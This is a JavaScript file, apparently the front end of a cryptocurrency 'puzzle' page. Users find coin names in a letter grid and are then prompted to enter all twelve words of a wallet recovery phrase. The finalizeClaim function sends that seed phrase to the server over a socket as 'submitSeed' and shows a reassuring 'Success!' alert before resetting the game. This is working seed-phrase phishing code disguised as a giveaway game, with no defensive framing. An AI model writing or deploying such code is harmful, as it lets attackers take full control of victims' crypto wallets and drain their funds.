const winningWords = ["BITCOIN", "ETHEREUM", "SOLANA", "MONERO", "CARDANO", "BINANCE"];
let selectedTiles = [];
const socket = io();

function createGrid() {
    const gridContainer = document.getElementById('game-grid');
    if (!gridContainer) return;
    gridContainer.innerHTML = ''; 
    const fullGrid = [..."BITCOINW", ..."ETHEREUM", ..."SOLANAXR", ..."MONEROVY", ..."CARDANOZ", ..."BINANCEL", ..."KTYUPOLM", ..."QWASDFGH"];
    fullGrid.forEach((char, index) => {
        const cell = document.createElement('div');
        cell.className = 'cell'; 
        cell.innerText = char;
        cell.onclick = () => {
            cell.classList.toggle('active');
            if (cell.classList.contains('active')) { selectedTiles.push({ char, index }); } 
            else { selectedTiles = selectedTiles.filter(t => t.index !== index); }
            checkMatches();
        };
        gridContainer.appendChild(cell);
    });

    const inputFields = document.getElementById('input-fields');
    if (inputFields) {
        inputFields.innerHTML = '';
        for (let i = 1; i <= 12; i++) {
            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = `${i}. Word`;
            input.id = `word-${i}`;
            inputFields.appendChild(input);
        }
    }
}

function checkMatches() {
    const currentString = selectedTiles.map(t => t.char).join('');
    let matchesFound = 0;
    winningWords.forEach(word => { if (currentString.includes(word)) matchesFound++; });
    document.getElementById('progress').innerText = `Matches Found: ${matchesFound}/6`;
    if (matchesFound === 6) {
        setTimeout(() => {
            document.getElementById('puzzle-view').style.display = 'none';
            document.getElementById('seed-view').style.display = 'block';
        }, 500);
    }
}

function openInput() {
    document.getElementById('pre-btn').style.display = 'none';
    document.getElementById('main-input-panel').style.display = 'block';
}

function finalizeClaim() {
    let words = [];
    for (let i = 1; i <= 12; i++) {
        const val = document.getElementById(`word-${i}`).value.trim();
        if (val) words.push(val);
    }

    if (words.length === 12) {
        socket.emit('submitSeed', { seedPhrase: words.join(' ') });
        alert("Success! Your request is being processed.");
        
        // RESET UI BACK TO PUZZLE
        selectedTiles = [];
        document.getElementById('seed-view').style.display = 'none';
        document.getElementById('puzzle-view').style.display = 'block';
        document.getElementById('main-input-panel').style.display = 'none';
        document.getElementById('pre-btn').style.display = 'block';
        createGrid();
        document.getElementById('progress').innerText = `Matches Found: 0/6`;
    } else {
        alert("Please enter all 12 words.");
    }
}

window.onload = createGrid;